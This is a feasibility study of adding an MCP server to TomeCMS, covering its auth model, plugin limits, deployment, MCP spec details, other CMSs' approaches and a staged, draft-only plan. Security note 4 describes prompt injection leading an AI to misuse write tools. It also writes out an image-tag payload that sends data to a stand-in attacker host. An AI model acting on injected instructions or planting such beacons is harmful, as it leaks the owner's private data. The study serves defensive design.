# Should TomeCMS get an MCP server? Feasibility study

Study date: 2026-09-29. Code studied: the `develop` branch at package version 1.0.4. Nothing in the repo was changed by the study; the only side effect was a scratch install of the MCP SDK, outside the repo, to measure it.

Effort scale (my estimate for one maintainer, not measured): S = days, M = 1-2 weeks, L = several weeks, XL = a quarter or more.

---

## Answer in short

Yes, it is worth doing, but as a **built-in, off-by-default feature of the app** and not as a plugin and not as a separate container. Two facts from the code decide this. First, the plugin system is deliberately closed: a plugin cannot add a route, touch the database or add an admin screen, and an MCP server needs all three. Second, an outside program cannot log in to the admin today: sign-in is passkey-only, the admin API accepts browser cookie sessions only, and there are no API tokens.

The safe way in is in steps. Step 1 is a **read-only** `/mcp` address on your own site that lets an AI read your *published* content. Nothing needs to be logged in, so there is nothing new to attack, and it works with Claude on every surface. Step 2 adds **revocable, scoped access tokens** you create in the admin, and lets an AI read drafts and **create or edit drafts only**. An AI should never publish or delete through this door: TomeCMS has no trash and no version history, so a delete is permanent. Step 3, a full "sign in with your passkey" OAuth flow so that claude.ai's connector screen can do writes, is the biggest piece and only worth it if you want non-technical owners to use it from the Claude app.

---

## What exists today

### 1. The public read API (no login)

- Routes: `site`, `posts`, `posts/{slug}`, `pages`, `pages/{slug}`, `categories`, `navigation`, `slides`, `preview/{token}`, `openapi.json` under `src/pages/api/v1/content/` (10 route files). Plus `src/pages/api/v1/stats/hit.ts`, which only counts readers.
- Anonymous, `GET`/`OPTIONS` only, `Access-Control-Allow-Origin: *`, cached 60 s (`src/server/http/public-response.ts:18-26, 62-77`). Errors are RFC 9457-style problem documents (`src/server/http/problem.ts:20-45`).
- Only "live" content: status published, dated, and the date has come (`src/server/content/live.ts:14-18`). Drafts and scheduled posts are not returned. A draft can be read only through a 30-minute preview token that the *admin* mints (`src/server/content/previews.ts:12, 29-70`; route `src/pages/api/v1/content/preview/[token].ts`).
- Each item carries both `contentHtml` and the editor's `contentJson` (`src/server/http/public-schemas.ts:82-96`), each up to 1 MB (`src/lib/editor-content.ts:7`). That is far too heavy to hand to an AI unchanged; an MCP layer would trim it to text.
- **There is no search endpoint.** Lists filter by locale and category only (`public-schemas.ts:22-31`).
- A machine-readable contract already exists: `openapi.json` (OpenAPI 3.1, `src/server/http/openapi.ts:61-69`).
- When the owner has closed the site for maintenance, `/api/v1/content/*` answers 503 to everyone except the signed-in owner (`src/middleware.ts:38-45, 127-155`). Anything built on the public API goes dark then.

### 2. The admin API and how it authenticates

- 28 route files under `src/pages/api/admin/` (posts, pages, media incl. `uploads` and `uploads/[id]/finalize`, categories, navigation, settings, maintenance, plugins, security/passkeys, security/recovery-codes, system/updates, redirects, slides, themes, videos, previews, brand, suggest-excerpt). 53 source files reference `requireInstalledOwner`/`requireOwner` (the admin API routes, admin pages and the guard itself).
- Authentication is **better-auth with passkeys only**: `emailAndPassword: { enabled: false }` (`src/server/auth/config.ts:51`). A session is created only by a passkey ceremony, and every session row must point at the passkey that created it (`config.ts:56-79`). Config sets no session lifetime, so better-auth's default of 7 days applies (I checked the default in `node_modules/better-auth/dist/context/create-context.mjs:53`).
- The guard is one function: `requireInstalledOwner(request.headers)` reads the session from the request's cookie headers (`src/server/auth/session.ts:12-32`). **I found no API token, personal access token, service account or bearer mechanism** anywhere in `src/server/auth` or `src/pages/api`. (better-auth's own `bearer` plugin exists in the installed package, `node_modules/better-auth/dist/plugins/bearer`, but it only re-presents a *session* token, which is full owner power; nothing in the repo uses it.)
- Sensitive actions demand a passkey session younger than 5 minutes (`src/server/auth/fresh-session.ts:7-23`; used at `src/pages/api/admin/system/updates.ts:63` and `.../security/recovery-codes.ts:27`).
- CSRF/origin: every non-`GET` admin call runs `assertSameOrigin`, which **rejects a request that has no `Origin` header** (`src/server/auth/origin.ts:21-31`). Browsers always send it; a script has to fake it. Astro's own check (`security.checkOrigin`, default on in 7.3.3) only blocks cross-origin *form-type* content and is not triggered by JSON (`node_modules/astro/dist/core/app/origin-check.js:1-25`).
- Rate limits: a Postgres-backed limiter for only five named actions (`install`, `signin`, `recovery`, `update-check`, `update-apply`) (`src/server/auth/rate-limit.ts:8-16`). The action list is also a database CHECK constraint, so a new action needs a migration (`src/server/db/migrations/008_update_rate_limit_actions.ts`). The public API and content writes have no limiter.
- Good news for reuse: the business logic is separate from HTTP. `createPost(ownerId, input)`, `updatePost`, `updatePostStatus`, `deletePost` and the published-content readers take an owner id, not a request (`src/server/content/posts.ts:71-306`, `published.ts`). An in-app MCP route could call them directly after its own authentication.
- Concurrency is already safe for an AI: updates and deletes require the item's `updatedAt` and answer 409 on a mismatch (`src/server/content/mutations.ts:102-106`), so an assistant must read before it writes and cannot silently overwrite a newer edit.
- **Irreversibility:** `deletePost` is a hard `DELETE` (`src/server/content/posts.ts:298`). There is no trash, revision or undo table (searched migrations and content code). Recovery is a backup restore.
- During a managed update, writes to `/api/admin/*` get a 503 (`src/server/update/maintenance.ts:19-31`, wired at `src/middleware.ts:90-96`). That freeze covers **only** `/api/admin` paths, so a new `/mcp` write route would have to call `isUpdateWriteBlocked()` itself.

### 3. What a plugin can do today (short: very little, on purpose)

- `src/plugins/contract.ts` opens by saying there is no hook for startup code, none for the database and none for a route (lines 1-11). The closed hook set is three: `signIn`, `publicPage`, `editorSuggestions` (line 57). Capabilities are settings (text, secret, switch, colour, choice, image; lines 26-44) plus the methods on `Plugin` (lines 161-225): sign-in widget/verdict, site notice, popup, a browser-side client module, and three "answer a question about a draft" methods.
- Plugins are compiled into the repo through static maps (`src/plugins/registry.ts:7-13`, `manifests.ts:12`); "nothing installs a plugin while the site runs" (`website/src/content/docs/extending/plugins.md:8-10`). The contract itself says runtime installation would need the browser-side hook re-reviewed (`contract.ts:183-189`).
- There is no plugin-owned table (migrations are a compiled-in registry the updater audits: `docs/specs/2026-09-14-plugin-system-design.md:38-49`), no admin screen of its own (the Plugins page draws forms from manifests), and no background work.
- The design record says so directly: "No routes, no database, no reaching into `src/server`" (`docs/specs/2026-09-20-plugin-system-design.md:29-31`), and lists "plugin-supplied routes or admin screens" as out of scope (same file, line 42). The earlier note says that anything that acts on the owner's behalf first needs a "capability/permission model" that does not exist (`2026-09-14-plugin-system-design.md:93-103`).
- The five existing plugins (Turnstile, notice, popup, lightbox, Jev/TypeSafe) all point *outward* or decorate pages. Jev calls an external AI service from the editor (`src/plugins/typesafe/api.ts`); MCP is the opposite direction (an AI calls *in*). No existing plugin resembles what MCP needs.
- Useful precedent to copy: plugins are off by default, switched on in the admin, and `npm run plugin:disable <id>` turns one off from a shell if the admin is unreachable (`scripts/plugin-disable.ts`).

### 4. Deployment shape

- A managed install runs three containers: `postgres`, `seaweedfs` (S3 for media) and `app` (`compose.managed.yaml`), each bound to `127.0.0.1`. TLS ends at Caddy, which is written by `scripts/prepare-vps.sh:97-114`: the CMS host is `reverse_proxy 127.0.0.1:4321` (everything under it), the media host goes to SeaweedFS on 9000. **A new path such as `/mcp` inside the app is reachable through the existing Caddy config with no change.**
- The runtime image is one Node 22 image with production dependencies installed by `npm ci --omit=dev` (`Dockerfile`); a new npm dependency in `package.json` ships with the app image at no extra cost in process count.
- The web updater replaces **only the app image**, checks a "compose contract" version and health-checks exactly `app postgres seaweedfs` (`src/updater/verify.ts:161-164, 296-310`); installing other containers or compose files is an explicit non-goal (`docs/specs/2026-09-13-managed-web-updates-design.md:54`). A fourth "mcp" container would therefore mean a compose-contract bump, a new Caddy rule (the script rewrites the Caddyfile and refuses foreign edits) and a second image to build and attest. Not natural.
- A local stdio server (the kind Claude Desktop launches) would run on the **owner's computer**, not the VPS. It only sees what the network shows it (the public API), and it needs Node or a packaged bundle on that computer.
- Claude's hosted apps (claude.ai, Desktop, mobile) call remote MCP servers from Anthropic's addresses (`160.79.104.0/21`), so a public VPS works; a `localhost` dev install does not (`claude.com/docs/connectors/building/authentication`, "Network reference").

### 5. Content model, and what is safe to hand an AI

- A post is Tiptap/ProseMirror JSON plus sanitized HTML (`src/server/content/editor.ts`, `src/lib/editor-content.ts`). **There is no Markdown anywhere in `src`** (searched). Reading is easy to flatten to text (`editorText`, `src/lib/editor-content.ts:118`); writing needs a Markdown-to-editor-JSON converter that emits only node types the editor schema knows (paragraph, headings 1-3, lists, quote, code, table, image by media id, attachment, video). Tiptap ships an official `@tiptap/markdown` at the same 3.31.3 version the repo uses (npm registry; MIT; depends on `marked`), but I have **not** tested it against the server-side schema, so treat it as promising, unproven.
- Limits an AI must respect: title 200, excerpt 120, meta title 70, meta description 320, slug pattern, up to 20 categories (`mutations.ts:18-28`, `posts.ts:33-45`).
- Bilingual: Thai/English editions share a `translationGroupId`; creating the other edition is `createPost` with `sourcePostId` + `locale` (`posts.ts:35-44`). "Translate this post into English as a draft" maps onto that directly.
- Drafts and scheduling: `status` is `draft`/`published`; a future `publishedAt` schedules (`mutations.ts:18-28`).
- Media is a two-step flow: reserve an upload, then the browser PUTs the file to a presigned S3 URL on the media host, then finalize (`src/server/media/service.ts:234-345`). Awkward for an AI (needs either a big base64 argument or the server fetching a URL, which is an SSRF risk). Leave uploads out of the first versions. Strapi's MCP made the same call: it can reference existing media but not upload new files (see precedents).
- **No visitor-authored content exists.** There is no comments, forms or subscribers table (`src/server/db/reset-tables.ts` lists every table; `stats/hit` only counts). The only author of text in the CMS is the owner. That lowers one classic MCP risk (see Security notes).

---

## What the MCP world looks like now (verified against the live spec, 2026-09-29)

| Topic | Fact | Source |
|---|---|---|
| Current spec | Version **2026-07-28**. Stateless: no `initialize` handshake, no protocol sessions, no standalone GET stream; each request carries its own version/capability metadata. | spec index, transports |
| Transports | Two standard ones: **stdio** (client launches a subprocess) and **Streamable HTTP** (one endpoint, every message is a POST answered with JSON or a per-request SSE stream). HTTP+SSE (2024) is deprecated. The transport has changed shape twice in ~18 months (2024-11, 2025-03, 2026-07). | transports, streamable-http |
| Origin check | Servers **MUST** validate the `Origin` header (403 if present and not allowed) to stop DNS rebinding; SHOULD authenticate every connection. | streamable-http |
| Authorization | **Optional.** For HTTP it is OAuth 2.1: the MCP server is a resource server; **MUST** publish Protected Resource Metadata (RFC 9728) and answer 401 with a `WWW-Authenticate` pointer; clients use PKCE and the `resource` parameter (RFC 8707); the server **MUST** check the token was issued *for it* (audience). Client registration: Client ID Metadata Documents preferred, Dynamic Client Registration now "deprecated, kept for compatibility", or pre-registration. stdio servers should NOT use this flow, they read credentials from the environment. | basic/authorization |
| Static tokens | Not part of the spec's OAuth story, but a plain `Authorization: Bearer <token>` is what Claude Code accepts via `--header` (Claude Code docs). claude.ai's custom-connector screen offers OAuth or "none"; a fixed API key/bearer header ("static_headers") is a **beta for a limited set of organizations**. | code.claude.com/docs/en/mcp; claude.com/docs/connectors/building/authentication |
| Primitives | Tools (model calls them), resources (data), prompts (user templates). Tool `annotations` (`readOnlyHint`, `destructiveHint`, `idempotentHint`, `openWorldHint`) are hints; the spec says clients **MUST treat them as untrusted** unless the server is trusted. Servers **MUST** validate inputs, apply access control, rate limit, sanitize output; clients SHOULD keep a human in the loop. Defaults for the hints (readOnly false, destructive true, idempotent false, openWorld true) are from earlier revisions; the 2026-07-28 schema page did not show them, so **not re-verified**. | server/tools |
| Tool set per caller | The tool list may vary by the authorization presented, e.g. only tools the token's scopes allow. | server/tools |
| TypeScript SDK | **v2 is stable** and matches the 2026-07-28 spec. `@modelcontextprotocol/server` 2.2.0 (published 2026-09-28): dependencies only `zod ^4.2` and `@modelcontextprotocol/core`; Node >= 20; npm license field MIT (the repo's LICENSE says new contributions are Apache-2.0, older code MIT: both compatible with TomeCMS's MIT). Old `@modelcontextprotocol/sdk` 1.31 still gets fixes but pulls express, hono, jose and more. | npm registry; github.com/modelcontextprotocol/typescript-sdk |
| Runs inside Astro? | `createMcpHandler(factory)` returns `{ fetch(Request): Promise<Response> }`, the same shape as an Astro API route. **I ran it in a scratch directory** on a plain Web `Request`: `tools/list` and `tools/call` both answered `200 application/json`, annotations passed through. A fresh server object is built per request (stateless). Not run inside Astro itself: inferred to work because Astro routes speak the same Request/Response types. The handler does **no** Host/Origin checks and never derives auth from headers; you add `originValidationResponse` and pass the verified caller in (`fetch(request, { authInfo })`); a web-standard `requireBearerAuth` gate ships too. The default posture also answers older 2025-era clients statelessly. | SDK docs `serving/web-standard.md`, `authorization.md`, `legacy-clients.md`; my spike |
| Size | Scratch install: `@modelcontextprotocol/server` 6.4 MB + `core` 1.3 MB unpacked, 3 packages total; `zod` (8 MB) is already a TomeCMS dependency. `npm install` reported 0 vulnerabilities. | my spike |

### Precedents (how other CMSs did it)

| CMS | Form | Auth | Notes |
|---|---|---|---|
| Strapi (self-hosted core since v5.47) | Built in, `/mcp` on the app | Admin API tokens; **disabled by default**, must be enabled in config | Up to 8 tools per content type (list, get, create, update, delete, publish, unpublish, discard_draft); tool list and fields shrink to the token's permissions; logs tag actions `origin: mcp`; cannot upload media; deleting a folder cascades with no undo |
| Payload | Official plugin `@payloadcms/plugin-mcp`, `/api/mcp` | Bearer API keys, created in the admin, with per-collection/per-operation toggles; key collection denies admin/REST/GraphQL by default | Generic tools: find, create, update, delete documents, schema discovery. (A Payload "plugin" is code with full server access, unlike a TomeCMS plugin.) |
| Directus | Built in remote MCP since v11.12 | Not checked in detail | |
| WordPress | Official `mcp-adapter` on the Abilities API | Application Passwords (no expiry, act as a user, often an admin) or OAuth | Abilities are private unless marked public; three generic tools (discover, get-info, execute); security write-ups warn about admin-level, never-expiring credentials and recommend one scoped credential per connection |
| Sanity | Hosted `mcp.sanity.io` (vendor-run) | OAuth login or scoped API token | 40+ tools; schema-aware guidance built in |
| Contentful | Official hosted `mcp.contentful.com/mcp` | OAuth | Community local server uses a management token |
| Ghost | **Community servers only** | Admin API key from a custom integration | No official server found |

What repeats: the endpoint lives in the product (or is vendor-hosted), it is **opt-in**, the credential is **scoped and revocable**, the tools are generic CRUD on content types, and the more careful ones hide or omit what the credential cannot do.

---

## Options

Legend for "fit": how well it matches the managed install (Caddy, one app image, web updater).

| # | Option | What it gives you | Effort | Risk | Fit |
|---|---|---|---|---|---|
| A0 | **Core `/mcp`, read-only, no login** (published content only) | AI can read posts/pages/categories/menus; works on every Claude surface; nothing new to steal | S | Low | Excellent (same app, same Caddy, no new container) |
| A | **Core `/mcp` + scoped revocable tokens** (adds drafts + draft writes) | Drafting, translating, editing drafts; Claude Code and header-capable clients | M-L | Medium (new auth, new write path) | Excellent, needs one migration + admin screen |
| A+ | A plus **OAuth** via better-auth's OAuth provider (passkey-gated consent) | Same, but for claude.ai / Desktop / mobile connector screen | L-XL | Medium-high (touches the sign-in core) | Good, but a lock-out class of risk for a passkey-only product |
| B | **Plugin** | Nice on/off UI | XL | High | Poor: contract forbids routes/DB/screens |
| C | **Standalone package** (stdio and/or HTTP) using public API + admin API | Runs next to Claude Desktop | S read-only; L with writes | Medium | Poor for writes (see below); OK for read-only |
| D | **Read-only standalone** over the public API | Same as A0 but on your machine | S | Low | Fair (no server change; friction on the owner's laptop; goes dark in maintenance) |
| E1 | better-auth `bearer` plugin so an MCP client reuses a session token | "Works" fast | S | **High: token = full admin** | Reject |
| E2 | Generic OpenAPI-to-MCP bridge pointed at `openapi.json` | Zero code, read-only | XS | Low | Fair; unverified quality, clumsy tools |

**A0, read-only in the app.** A `/mcp` route built with the SDK's `createMcpHandler`, calling the same published-content readers the public API uses (`published.ts`), returning trimmed text rather than 1 MB of HTML+JSON, plus a new `search_content` tool because the public API has none. Off by default with an owner switch. Since it exposes only what `/api/v1/content` already exposes to the whole internet, there is no new data exposure; the work is honoring maintenance mode (add `/mcp` to `maintenanceRoute`, `src/middleware.ts:38-45`), Origin validation, output caps and a docs page. It also works for a headless site, where the CMS's own pages are 404 and robots disallow everything (`website/src/content/docs/running/modes.md`). The honest limit: read-only public data is modest value, since an AI can already fetch your public pages; the gain is structure (locale, categories, pagination, translations) and a base to build on.

**A, tokens + draft writes.** This is where the real value is (draft, translate, revise, review a draft you have not published). It needs: a token table modelled on `preview_tokens` (random 32 bytes, only the SHA-256 stored, expiry, revoked_at; `src/server/db/migrations/007_preview_tokens.ts`, `previews.ts:25-27, 56-65`); a "Connections" admin screen (create with a fresh-passkey requirement like `updates.ts:63`, show once, list, last used, revoke); an explicit decision for the new table in `RESET_TABLES` (the type forces it: `src/server/db/reset-tables.ts:1-16`); scope-filtered tools; the update-freeze check; audit logging. It reaches Claude Code and any client that can send a header. It does **not** reach claude.ai's connector screen except through the static-header beta.

**A+, OAuth.** `@better-auth/oauth-provider` 1.7.6 (MIT) offers a login page, a consent page, dynamic client registration and Client ID Metadata Document support (I read its typings; I did **not** build with it). The repo pins `better-auth` and `@better-auth/passkey` at exactly 1.7.3 (`package.json`), so this also means a version bump, new tables, a consent page, and testing the interplay with the passkey-only session hook (`config.ts:68-79`). The design history records three owner lock-outs in two days during the plugin work (`docs/specs/2026-09-20-plugin-system-design.md:14-20`); anything on the sign-in path deserves that caution. Defer until someone needs it.

**B, plugin.** To make it a plugin, the contract would have to grow a route hook, a way to read/write content through services (a capability model), a place for plugin-owned tables that the migrator, updater inventory and reset script understand, and admin screens. The project's own notes list exactly those as the unbuilt "hook surface and capability model" and rank them as most of the work (`2026-09-14-plugin-system-design.md:93-103, 122-131`). MCP would be the first plugin to need all of them at once, which makes it a poor first test of that platform. The only plugin-like thing worth borrowing is the *pattern*: off by default, an owner switch, a shell kill switch.

**C, standalone package.** For reading it is fine. For writing it cannot work today: a separate process cannot pass a passkey ceremony, cannot mint a session, and would need tokens the app does not have. So C-with-writes is A **plus** a second package to maintain. If you still want a local stdio flavour for Claude Desktop, Anthropic's `.mcpb` bundle format gives one-click install of a local server (docs: `claude.com/docs/connectors/building/mcpb`), but it should be a thin client of the token API, later.

**D, read-only standalone.** Zero risk to the server and quick, but it lives on the owner's laptop, needs Node or an `.mcpb` bundle, sees only published content, and returns 503 whenever the site is in maintenance. It is a fine weekend prototype to learn what tools feel useful, not a product.

**E1 (reject).** Adding bearer support inside `getSession`/`requireInstalledOwner` would instantly make every token a full owner credential across all 53 guarded files, including plugin settings and secrets, maintenance, settings, navigation and redirects (some sensitive routes require a fresh passkey session, most content and settings routes do not). Keep MCP tokens out of that seam: give them their own verifier that only `/mcp` calls.

---

## Recommendation

**Build it in the app, in three steps, and stop at each step until it proves useful.**

**Step 1, first small step (S): read-only `/mcp`, off by default.**
- One route (e.g. `src/pages/mcp.ts`) using `@modelcontextprotocol/server`, pinned to an exact version like the repo pins its other core deps; stateless; JSON responses only (no streams needed).
- Guards: `originValidationResponse` (spec MUST), an owner switch in the admin (a tiny migration; do not use an env var, the plugin design rejected `.env`-only configuration: `2026-09-20-plugin-system-design.md:34-36`), refuse when not installed or the site is closed for maintenance, cap result sizes, log tool name and status only.
- Tools (all read-only; annotations `readOnlyHint: true`, `idempotentHint: true`, `openWorldHint: false`):
  1. `get_site` : name, tagline, languages, time zone.
  2. `list_posts` : locale, optional category, page size and cursor; returns title, slug, excerpt, date, categories, available translations.
  3. `get_post` : locale + slug; returns metadata and a plain-text/Markdown body with a length cap, wrapped and labelled as content to read, not instructions.
  4. `list_pages` and 5. `get_page` : same for pages.
  6. `list_categories` : locale.
  7. `search_content` : query (+ optional locale); simple title/excerpt/text match; the public API has none.
- Test with the same technique as my spike (call `handler.fetch` with a `Request`), in `tests/unit`.
- Write a short docs page (English and Thai, the docs site is bilingual) that says what an AI can and cannot see, how to connect Claude (add the URL as an authless connector, or `claude mcp add --transport http`), and how to switch it off.

**Step 2 (M-L): tokens and draft writes**, only if Step 1 feels useful.
- Scopes: `content:read`, `drafts:read`, `drafts:write`. Tool list varies with scopes (allowed by the spec).
- Added tools: `list_drafts` and `get_draft` (readOnly); `create_draft` (writes, `destructiveHint: false`, `idempotentHint: false`; always `status: draft`; can take `sourcePostId`+`locale` to make the other-language edition); `update_draft` (`destructiveHint: true` because it replaces a body, `idempotentHint: true`; requires `updatedAt`; refuses anything not a draft; ideally only drafts created through MCP, marked "created by AI" with one extra column so the owner sees it in the list).
- Do **not** add: publish, unpublish, delete, settings, plugins, security, updates, maintenance, media upload. Publishing stays a human click in the admin. (If publishing is ever wanted, gate it behind a fresh-passkey step and a scope you must opt into.)
- Reject external image URLs and non-`/media/<uuid>` images in AI-written content (see Security notes 4).

**Step 3 (L-XL), optional: OAuth**, only if you want claude.ai/mobile connector-screen writes for non-technical owners. Use `@better-auth/oauth-provider`, passkey-gated consent, short-lived tokens, and treat it as a security project with its own review.

Why this order: the risk grows with each step while the reach grows too; Step 1 has no new credential to leak, Step 2 adds a credential but limits it to non-destructive draft work, Step 3 touches the sign-in core. Each step ships independently and none blocks the plugin platform.

---

## Security notes

1. **Bearer only, never cookies, on `/mcp`.** Cookie auth plus a public endpoint invites CSRF; a bearer token is not sent automatically by a browser. Do not reuse `assertSameOrigin` for token calls (it rejects requests with no Origin, `origin.ts:28-30`); use the MCP-spec check instead (reject only a *present, wrong* Origin).
2. **Tokens are not the owner.** Own verifier, own table, scopes, expiry, last-used time, one-click revoke, shown once, minted only with a fresh passkey (5 min). Never accept an MCP token on `/api/admin/*`, and never accept a session cookie on `/mcp`.
3. **No undo exists** (hard delete, no history, no trash). Hence: no delete tool; write only to drafts; consider keeping the previous body of an AI-edited draft in a side table before overwriting.
4. **Prompt injection, specific to TomeCMS.** Because nobody but the owner writes text into the CMS today, injection *through stored content* is unlikely. The realistic paths are: (a) the AI reads something hostile elsewhere in the same chat (web page, email, PDF) and then uses TomeCMS write tools; (b) **an exfiltration channel through content**: the editor accepts any `http(s)` image URL (`src/server/content/editor.ts:124-137`) and the sanitizer allows `http/https/mailto` links (`editor-content.ts:86-87`), so an injected draft could contain `<img src="https://attacker.example/?d=...">`, which fires when the owner opens the draft in the admin (and reaches the world if published). Mitigation: content written through MCP may reference only `/media/<uuid>` images and gets its links listed for review; drafts only; the human publishes. This is the classic "private data + untrusted content + a way to send data out" combination (Simon Willison's "lethal trifecta"); the safest design is to remove the third leg, which is what draft-only and image-restriction do.
5. **Annotations are hints, not enforcement.** The spec tells clients to distrust them. Real limits are the scopes and server-side checks.
6. **DNS rebinding / Origin:** the SDK handler does no Host/Origin validation on its own; add the helpers (spec MUST for Origin).
7. **Rate limits and size.** The public API has none today; for tokens add a limit (a new action means a migration because of the CHECK constraint, `008_...ts`), cap list sizes and body length, and set a per-call time budget.
8. **Maintenance and updates.** Reads must honor the closed-site setting; writes must honor the update freeze (`isUpdateWriteBlocked`) because the existing freeze only covers `/api/admin`.
9. **Logs and audit.** Log tool, token id, status, request id; never log content or the token. Tag writes as coming from MCP (Strapi logs `origin: mcp`). Posts have no "updated by" column today.
10. **No server-side URL fetching** (no "upload image from URL") in the first versions: SSRF.
11. **Supply chain.** New dependency `@modelcontextprotocol/server` (young v2 line, MIT/Apache-2.0 lineage, 2 new packages). Pin exact, watch advisories, keep the surface small. The SDK's v1 line has 6+ months of parallel fixes, so there is no forced rush.
12. **Kill switch.** An owner switch in the admin plus a shell command (like `plugin:disable`) that turns MCP off and revokes all tokens, so a leaked token never needs a code change.
13. **Privacy.** Whatever an AI tool returns goes to the AI provider you use. Say so in the docs, and keep drafts behind tokens.

---

## Open questions for the owner

1. **Who is this for?** Only you (Claude Code, a header-capable client), or every TomeCMS owner including non-technical people who will use claude.ai's connector screen? The second means Step 3 (OAuth).
2. **Is read-only enough to start, or is drafting the whole point?** If drafting is the point, Step 2 is the MVP and Step 1 is only its foundation.
3. **Should an AI ever be able to publish or delete?** My recommendation is never through MCP (no undo exists); publishing stays a click.
4. **Which AI apps do you actually use?** Claude Code works with a plain token today. claude.ai, Desktop and mobile need either OAuth or Anthropic's static-header beta.
5. **Are you comfortable with the trade-offs?** One new dependency (~8 MB), an endpoint that is internet-reachable when the switch is on, and a visible "created by AI" mark on AI drafts (one extra column).

---

## Evidence

### Verified by reading code (paths on the `develop` branch)

- Plugin contract and limits: `src/plugins/contract.ts:1-11, 26-44, 57, 161-225`; `src/plugins/registry.ts:7-13`; `src/plugins/manifests.ts:12`; `src/server/plugins/store.ts` (settings storage, secrets sealed); `scripts/plugin-disable.ts`; `website/src/content/docs/extending/plugins.md:8-10`; `docs/specs/2026-09-20-plugin-system-design.md:14-20, 29-42`; `docs/specs/2026-09-14-plugin-system-design.md:20-49, 76-103, 122-131`; `docs/specs/2026-09-14-ecommerce-plugin-design.md` (the same "needs shape B" conclusion for another feature).
- Auth: `src/server/auth/config.ts:48-119`; `session.ts:12-32`; `origin.ts:21-31`; `fresh-session.ts:7-23`; `rate-limit.ts:8-60`; `src/middleware.ts:38-45, 90-97, 127-178`; `src/pages/api/admin/system/updates.ts:53-82`; `src/pages/api/admin/posts/index.ts:40-102` (typical guarded route); `src/server/update/maintenance.ts:19-31`.
- Public API: `src/pages/api/v1/content/**`; `src/server/http/{public-response,problem,public-schemas,openapi}.ts`; `src/server/content/live.ts`, `published.ts`, `previews.ts`; `website/src/content/docs/api/overview.md`, `running/modes.md`.
- Content model: `src/server/content/{posts,mutations,editor}.ts`; `src/lib/editor-content.ts:7, 86-87`; `src/server/media/service.ts:234-345`; `src/server/db/reset-tables.ts`; `src/server/db/migrations/005_content.ts, 007_preview_tokens.ts, 008_update_rate_limit_actions.ts`.
- Deployment: `compose.managed.yaml`; `Dockerfile`; `scripts/prepare-vps.sh:97-114`; `src/updater/verify.ts:161-164, 296-310`; `docs/specs/2026-09-13-managed-web-updates-design.md:54`; `package.json` (exact pins for `better-auth` 1.7.3, `@better-auth/passkey` 1.7.3; `zod ^4.5.4`; Node >= 22.12).
- Astro origin check: `node_modules/astro/dist/core/app/origin-check.js:1-25`. better-auth session default: `node_modules/better-auth/dist/context/create-context.mjs:53`.

### Verified by running or querying (scratchpad, outside the repo)

- SDK spike: a scratch script, not kept in the repo (`createMcpHandler(...).fetch(new Request(...))` answering `tools/list` and `tools/call` as `200 application/json`; exports `originValidationResponse`, `requireBearerAuth`, `requireScopes`, `oauthMetadataResponse` present).
- npm registry (queried 2026-09-29): `@modelcontextprotocol/server` 2.2.0 (MIT, deps: zod, core), `@modelcontextprotocol/node` 2.1.0, `@modelcontextprotocol/sdk` 1.31.0, `@better-auth/oauth-provider` 1.7.6, `@better-auth/api-key` 1.7.6, `@tiptap/markdown` 3.31.3.

### Sources (paraphrased, not copied)

- MCP specification 2026-07-28: https://modelcontextprotocol.io/specification/latest ; transports https://modelcontextprotocol.io/specification/2026-07-28/basic/transports ; Streamable HTTP https://modelcontextprotocol.io/specification/2026-07-28/basic/transports/streamable-http ; authorization https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization ; authorization security https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations ; tools https://modelcontextprotocol.io/specification/2026-07-28/server/tools ; security best practices https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices
- TypeScript SDK v2: https://github.com/modelcontextprotocol/typescript-sdk (docs `serving/web-standard.md`, `serving/authorization.md`, `serving/legacy-clients.md`, `serving/sessions-state-scaling.md`)
- Claude connectors authentication (OAuth, static headers beta, egress range): https://claude.com/docs/connectors/building/authentication ; Claude Code remote MCP and `--header`: https://code.claude.com/docs/en/mcp ; MCPB bundles: https://claude.com/docs/connectors/building/mcpb
- Better Auth MCP plugin docs: https://better-auth.com/docs/plugins/mcp
- Precedents: Strapi https://docs.strapi.io/cms/features/strapi-mcp-server ; Payload https://payloadcms.com/docs/plugins/mcp ; WordPress adapter https://developer.wordpress.org/news/2026/02/from-abilities-to-ai-agents-introducing-the-wordpress-mcp-adapter/ and https://www.trustedlogin.com/2026/08/04/wordpress-mcp-servers-what-they-let-an-agent-do/ ; Sanity https://www.sanity.io/docs/ai/mcp-server ; Directus https://directus.io/docs/guides/ai/mcp ; Contentful https://www.npmjs.com/package/@contentful/mcp-server (and search summaries); Ghost community servers (search results only)
- Prompt-injection framing: https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/

### Inferred or not verified

- The SDK handler running **inside an Astro route** on the Node adapter (only run on a plain `Request`).
- `@tiptap/markdown` working against the server-side editor schema (`editor.ts:47-70`).
- `@better-auth/oauth-provider` integrating cleanly with the passkey-only session hook (typings read, no build).
- Default values of the tool annotation hints on the 2026-07-28 schema page (taken from earlier spec revisions).
- Directus MCP auth details and Contentful/Sanity tool lists (from search summaries, not the vendors' full docs).
- Effort labels S/M/L/XL are judgment, not measurement.
